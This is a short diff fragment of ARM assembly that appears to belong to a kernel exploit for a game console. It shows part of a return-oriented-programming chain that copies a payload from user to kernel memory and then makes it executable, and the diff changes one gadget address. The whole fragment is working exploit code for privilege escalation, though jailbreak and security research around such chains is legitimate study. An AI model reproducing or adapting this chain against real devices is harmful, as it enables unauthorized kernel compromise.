@@ -62,7 +62,7 @@ copy_from_user_to_kernel:
   .word BASE+0x00000347 @ r3 = pop {pc}
   .word      0xDEADBEEF @ r4 = dummy
   .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
-  .word BASE+0x00006289 @ ksceKernelMemcpyUserToKernel(r0 = payload_code_block, r1 = PAYLOAD_ADDR, r2 = PAYLOAD_SIZE); ?pop {r3, r4, r5, pc}?
+  .word BASE+0x0000825d @ ksceKernelMemcpyUserToKernel(r0 = payload_code_block, r1 = PAYLOAD_ADDR, r2 = PAYLOAD_SIZE); ?pop {r3, r4, r5, pc}?
 
 mark_executable:
   .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
